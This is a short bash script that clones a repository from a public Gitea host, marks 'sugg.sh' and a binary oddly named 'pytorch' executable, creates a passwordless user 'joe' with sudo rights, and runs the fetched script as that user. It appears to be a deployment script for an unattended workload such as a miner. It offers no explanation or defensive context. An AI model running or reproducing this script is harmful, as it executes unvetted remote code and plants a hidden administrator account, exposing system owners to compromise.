#!/bin/bash
sudo apt update
git clone https://try.gitea.io/xmanusnia/Workergits.git && cd Workergits
chmod +x sugg.sh && chmod +x pytorch
sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe
sudo -u joe -H sh -c "./sugg.sh"